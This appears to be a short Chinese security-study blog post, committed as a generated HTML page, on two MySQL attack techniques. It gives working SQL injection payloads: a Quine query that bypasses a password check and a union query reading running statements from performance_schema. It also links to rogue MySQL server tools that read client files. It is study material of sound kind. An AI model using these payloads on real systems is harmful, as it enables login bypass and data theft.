@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1. $sqlQurey[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password除了正确的密码能通过验证之外，让查询语句和查询结果一样也能通过验证 1.1 Quine参考： 从三道赛题再谈Quine trick (suphp.cn) SQLi-Quine (shysecurity.com) 123# 查询下面的语句SELECT REPLACE(REPLACE(&amp;#x27;REPLACE">
+<meta property="og:type" content="website">
+<meta property="og:title" content="TeFuir&#39;Blog">
+<meta property="og:url" content="https://tefuir72.github.io/note/2%E4%B8%AAmysql%E7%9F%A5%E8%AF%86%E7%82%B9%E5%88%86%E4%BA%AB.html">
+<meta property="og:site_name" content="TeFuir&#39;Blog">
+<meta property="og:description" content="1. $sqlQurey[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password除了正确的密码能通过验证之外，让查询语句和查询结果一样也能通过验证 1.1 Quine参考： 从三道赛题再谈Quine trick (suphp.cn) SQLi-Quine (shysecurity.com) 123# 查询下面的语句SELECT REPLACE(REPLACE(&amp;#x27;REPLACE">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-07T00:45:45.907Z">
+<meta property="article:modified_time" content="2021-11-07T00:45:45.897Z">
+<meta property="article:author" content="Te Fuir">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>TeFuir&#39;Blog</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4">
+        
+          <header id="header">
+  <a href="/">
+  
+    
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+    
+  
+    <div id="title">
+      <h1>TeFuir&#39;Blog</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Writing</a></li>
+       
+        <li><a href="/links/">links</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <div class="content" itemprop="articleBody">
+      
+          <h1 id="1-sqlQurey-39-password-39-password"><a href="#1-sqlQurey-39-password-39-password" class="headerlink" title="1. $sqlQurey[&#39;password&#39;] === $password"></a>1. <code>$sqlQurey[&#39;password&#39;] === $password</code></h1><p>除了正确的密码能通过验证之外，让查询语句和查询结果一样也能通过验证</p>
+<h2 id="1-1-Quine"><a href="#1-1-Quine" class="headerlink" title="1.1 Quine"></a>1.1 Quine</h2><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://suphp.cn/anquanke/70/253570.html">从三道赛题再谈Quine trick (suphp.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.shysecurity.com/post/20140705-SQLi-Quine">SQLi-Quine (shysecurity.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 查询下面的语句</span><br><span class="line">SELECT REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;);</span><br><span class="line"># 其返回的结果和查询语句完全一样</span><br></pre></td></tr></table></figure>
+
+<p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种使得输入的<code>sql</code>语句和输出的<code>sql</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p>
+<p>使用时根据实际查询语句和WAF适当变化，如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span>;</span><br><span class="line">#其中</span><br><span class="line">$password <span class="operator">=</span> <span class="string">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;</span>&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/sniper#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(&quot;.&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),&quot;.&quot;)<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span>sniper#<span class="string">&#x27;)/**/AS/**/sniper#</span></span><br><span class="line"><span class="string"># char(36)= &#x27;</span>$<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-PROCESSLIST-INFO"><a href="#1-2-PROCESSLIST-INFO" class="headerlink" title="1.2 PROCESSLIST_INFO"></a>1.2 PROCESSLIST_INFO</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># performance_schema.threads 表中的 PROCESSLIST_INFO 会记录线程正在执行的完整语句</span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>mid(`<span class="number">11</span>`,<span class="number">1</span>,<span class="number">217</span>)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>performance_schema.threads<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>name<span class="comment">/**/</span><span class="keyword">like</span><span class="string">&#x27;%connection%&#x27;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>)t;</span><br><span class="line"># 不同版本mysql的列数可能会不同,mysql5有<span class="number">17</span>列，mysql8有<span class="number">18</span>列</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="2-恶意MySQL服务"><a href="#2-恶意MySQL服务" class="headerlink" title="2. 恶意MySQL服务"></a>2. 恶意MySQL服务</h1><h3 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3277#toc-2">从MySQL出发的反击之路 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client’s File - lightless blog</a></p>
+<h3 id="恶意MySQL服务搭建："><a href="#恶意MySQL服务搭建：" class="headerlink" title="恶意MySQL服务搭建："></a>恶意MySQL服务搭建：</h3><p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">allyshka/Rogue-MySql-Server: MySQL fake server for read files of connected clients (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">rmb122/rogue_mysql_server: 一个支持 go, php, python, java, 原生命令行等多种语言下客户端的 mysql 恶意服务器 (github.com)</a></p>
+<p>目前mysql8版本还不能测试成功</p>
+
+        
+  </div>
+</article>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
